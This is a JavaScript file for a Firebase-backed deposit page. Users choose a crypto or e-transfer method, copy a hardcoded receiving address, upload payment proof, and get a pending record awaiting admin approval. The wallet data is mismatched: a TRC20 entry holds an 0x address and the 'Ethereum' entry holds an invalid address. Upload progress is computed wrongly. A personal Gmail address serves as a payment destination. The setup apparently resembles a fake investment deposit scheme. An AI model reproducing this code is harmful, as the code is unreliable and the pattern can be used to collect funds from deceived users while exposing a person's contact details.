import { auth, db, storage } from "./firebase.js";

import {
    onAuthStateChanged,
    signOut
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js";

import {
    doc,
    getDoc,
    collection,
    addDoc,
    serverTimestamp
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";

import {
    ref,
    uploadBytesResumable,
    getDownloadURL
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-storage.js";


/* ==========================================
   HTML ELEMENTS
========================================== */

const depositForm =
    document.getElementById("depositForm");

const amount =
    document.getElementById("amount");

const paymentMethod =
    document.getElementById("paymentMethod");

const walletCard =
    document.getElementById("walletCard");

const walletTitle =
    document.getElementById("walletTitle");

const walletNetwork =
    document.getElementById("walletNetwork");

const walletAddress =
    document.getElementById("walletAddress");

const copyAddress =
    document.getElementById("copyAddress");

const paymentProof =
    document.getElementById("paymentProof");

const proofPreview =
    document.getElementById("proofPreview");

const proofPreviewContainer =
    document.getElementById("proofPreviewContainer");

const paymentSent =
    document.getElementById("paymentSent");

const submitBtn =
    document.getElementById("submitBtn");

const submitText =
    document.getElementById("submitText");

const loadingSpinner =
    document.getElementById("loadingSpinner");

const alertBox =
    document.getElementById("alertBox");

const logoutBtn =
    document.getElementById("logoutBtn");
    /* ==========================================
   GLOBAL VARIABLES
========================================== */

let currentUser = null;

let currentUserData = null;

let proofImageURL = "";


/* ==========================================
   ALERT
========================================== */

function showAlert(message,type="success"){

    alertBox.innerHTML = `

        <div class="alert alert-${type}">

            ${message}

        </div>

    `;

}
/* ==========================================
   ID GENERATORS
========================================== */

function generateDepositId(){

    return "DEP-" + Date.now();

}

function generateTransactionId(){

    return "TXN-" + Date.now();

}

function generateNotificationId(){

    return "NOT-" + Date.now();

}

function generateReference(){

    return "REF-" + Math.floor(
        1000000000 + Math.random() * 900000000
    );

}
/* ==========================================
   WALLET ADDRESSES
========================================== */

const wallets = {

    usdt:{

        title:"USDT Wallet",

        network:"TRC20",

        address:"0x82633933E8ea8ED49A8350320A26bBD3928C65d0"

    },

    bitcoin:{

        title:"Bitcoin Wallet",

        network:"Bitcoin",

        address:"bc1qehc6asek4lwewyk6296u03nf69mdrve5xnruav"

    },

    ethereum:{

        title:"Ethereum Wallet",

        network:"ERC20",

        address:"3dZx1CG7QuctVjRc4KfUFJ1Nq1rbyfhgh8687gvhvi"

    },

     Etransfer:{

        title:"Etransfer Wallet",

        network:"E transfer",

        address:"daniellewatson8285@gmail.com"

    },

};
/* ==========================================
   AUTHENTICATION
========================================== */

onAuthStateChanged(auth, async(user)=>{

    if(!user){

        window.location.href = "login.html";

        return;

    }

    currentUser = user;

    try{

        const userRef = doc(
            db,
            "users",
            user.uid
        );

        const userSnap = await getDoc(userRef);

        if(!userSnap.exists()){

            showAlert(
                "User account not found.",
                "error"
            );

            return;

        }

        currentUserData = userSnap.data();

        console.log(
            "Logged in as:",
            currentUserData.fullName
        );

    }catch(error){

        console.error(error);

        showAlert(
            error.message,
            "error"
        );

    }

});
/* ==========================================
   PAYMENT METHOD SELECTION
========================================== */

paymentMethod.addEventListener("change", () => {

    const method = paymentMethod.value;

    if (!method) {

        walletCard.style.display = "none";

        return;

    }

    const wallet = wallets[method];

    if (!wallet) {

        walletCard.style.display = "none";

        return;

    }

    walletCard.style.display = "block";

    walletTitle.textContent = wallet.title;

    walletNetwork.textContent = wallet.network;

    walletAddress.value = wallet.address;

});
/* ==========================================
   COPY WALLET ADDRESS
========================================== */

copyAddress.addEventListener("click", async () => {

    if (!walletAddress.value) return;

    try {

        await navigator.clipboard.writeText(
            walletAddress.value
        );

        const originalText = copyAddress.innerHTML;

        copyAddress.innerHTML = `
            <i class="fa-solid fa-check"></i>
            Copied
        `;

        setTimeout(() => {

            copyAddress.innerHTML = originalText;

        }, 2000);

    } catch (error) {

        console.error(error);

        showAlert(
            "Unable to copy wallet address.",
            "error"
        );

    }

});
/* ==========================================
   PAYMENT PROOF PREVIEW
========================================== */

paymentProof.addEventListener("change",(e)=>{

    const file = e.target.files[0];

    if(!file){

        proofPreviewContainer.style.display="none";

        proofPreview.src="";

        return;

    }

    /* ===============================
       FILE TYPE VALIDATION
    =============================== */

    const allowedTypes=[

        "image/jpeg",
        "image/jpg",
        "image/png",
        "image/webp"

    ];

    if(!allowedTypes.includes(file.type)){

        showAlert(
            "Only JPG, JPEG, PNG and WEBP images are allowed.",
            "error"
        );

        paymentProof.value="";

        proofPreviewContainer.style.display="none";

        return;

    }

    /* ===============================
       FILE SIZE VALIDATION
    =============================== */

    const maxSize=5*1024*1024;

    if(file.size>maxSize){

        showAlert(
            "Image size must not exceed 5 MB.",
            "error"
        );

        paymentProof.value="";

        proofPreviewContainer.style.display="none";

        return;

    }

    const reader=new FileReader();

    reader.onload=(event)=>{

        proofPreview.src=event.target.result;

        proofPreviewContainer.style.display="block";

    };

    reader.readAsDataURL(file);

});
/* ==========================================
   UPLOAD PAYMENT PROOF
========================================== */

async function uploadPaymentProof(file){

    if(!file){

        return "";

    }

    const extension=file.name.split(".").pop();

    const storageRef=ref(

        storage,

        `depositProof/${currentUser.uid}/${Date.now()}.${extension}`

    );

    const uploadTask=uploadBytesResumable(

        storageRef,

        file

    );

    return new Promise((resolve,reject)=>{

        uploadTask.on(

            "state_changed",

            (snapshot)=>{

                const progress=Math.round(

                    (snapshot.bytesTransferred/

                    snapshot.totalBytes)*1000000

                );

                console.log(

                    "Upload:",

                    progress+"%"

                );

            },

            (error)=>{

                reject(error);

            },

            async()=>{

                const downloadURL=

                    await getDownloadURL(

                        uploadTask.snapshot.ref

                    );

                resolve(downloadURL);

            }

        );

    });

}
/* ==========================================
   SUBMIT DEPOSIT
========================================== */

depositForm.addEventListener("submit", async (e) => {

    e.preventDefault();

    if (!currentUser) {

        showAlert(
            "Please login again.",
            "error"
        );

        return;

    }

    if (!currentUserData) {

        showAlert(
            "Unable to load your account.",
            "error"
        );

        return;

    }

    if (!paymentMethod.value) {

        showAlert(
            "Please select a payment method.",
            "error"
        );

        return;

    }

    if (!paymentSent.checked) {

        showAlert(
            "Please confirm that payment has been sent.",
            "error"
        );

        return;

    }

    const depositAmount = Number(amount.value);

    if (isNaN(depositAmount) || depositAmount <= 0) {

        showAlert(
            "Please enter a valid deposit amount.",
            "error"
        );

        return;

    }

    submitBtn.disabled = true;

    submitText.style.display = "none";

    loadingSpinner.style.display = "inline-flex";

    try {

        proofImageURL = "";

        const file = paymentProof.files[0];

        if (file) {

            proofImageURL =
                await uploadPaymentProof(file);

        }

        const depositId =
            generateDepositId();

        const transactionId =
            generateTransactionId();

        const notificationId =
            generateNotificationId();

        const reference =
            generateReference();
                    /* ==================================
           SAVE DEPOSIT
        ================================== */

        await addDoc(

            collection(db, "deposits"),

            {

                depositId,

                reference,

                userId:
                    currentUser.uid,

                fullName:
                    currentUserData.fullName,

                email:
                    currentUserData.email,

                amount:
                    depositAmount,

                paymentMethod:
                    paymentMethod.value,

                network:
                    walletNetwork.textContent,

                walletAddress:
                    walletAddress.value,

                proofImage:
                    proofImageURL,

                status:
                    "Pending",

                adminNote:
                    "",

                createdAt:
                    serverTimestamp()

            }

        );


        /* ==================================
           SAVE TRANSACTION
        ================================== */

        await addDoc(

            collection(db, "transactions"),

            {

                transactionId,

                reference,

                userId:
                    currentUser.uid,

                fullName:
                    currentUserData.fullName,

                email:
                    currentUserData.email,

                type:
                    "Deposit",

                category:
                    "Wallet",

                amount:
                    depositAmount,

                currency:
                    "USD",

                status:
                    "Pending",

                description:
                    `${paymentMethod.value.toUpperCase()} Deposit Request`,

                createdAt:
                    serverTimestamp()

            }

        );
                /* ==================================
           SAVE NOTIFICATION
        ================================== */

        await addDoc(

            collection(db, "notifications"),

            {

                notificationId,

                userId:
                    currentUser.uid,

                title:
                    "Deposit Submitted",

                message:
                    `Your deposit request of $${depositAmount.toLocaleString()} has been submitted successfully and is awaiting admin approval.`,

                type:
                    "deposit",

                read:
                    false,

                createdAt:
                    serverTimestamp()

            }

        );

        showAlert(
            "Deposit submitted successfully.",
            "success"
        );

        depositForm.reset();

        walletCard.style.display = "none";

        proofPreviewContainer.style.display = "none";

        proofPreview.src = "";

        proofImageURL = "";

    } catch (error) {

        console.error(error);

        let message = error.message;

        if (
            error.code === "storage/unauthorized"
        ) {

            message =
                "Firebase Storage permission denied.";

        }

        if (
            error.code === "storage/quota-exceeded"
        ) {

            message =
                "Firebase Storage quota exceeded.";

        }

        if (
            error.code === "permission-denied" ||
            error.code === "firestore/permission-denied"
        ) {

            message =
                "Firestore permission denied.";

        }

        showAlert(
            message,
            "error"
        );

    } finally {

        submitBtn.disabled = false;

        submitText.style.display = "";

        loadingSpinner.style.display = "none";

    }

});
/* ==========================================
   RESET DEPOSIT FORM
========================================== */

function resetDepositForm(){

    depositForm.reset();

    walletCard.style.display = "none";

    proofPreviewContainer.style.display = "none";

    proofPreview.src = "";

    proofImageURL = "";

}


/* ==========================================
   CLEAR ALERT
========================================== */

function clearAlert(){

    setTimeout(()=>{

        alertBox.innerHTML = "";

    },5000);

}


/* ==========================================
   AUTO CLEAR ALERT
========================================== */

const originalShowAlert = showAlert;

showAlert = function(message,type="success"){

    originalShowAlert(message,type);

    clearAlert();

};


/* ==========================================
   PAGE READY
========================================== */

document.addEventListener("DOMContentLoaded",()=>{

    console.log("Deposit Page Loaded Successfully.");

});
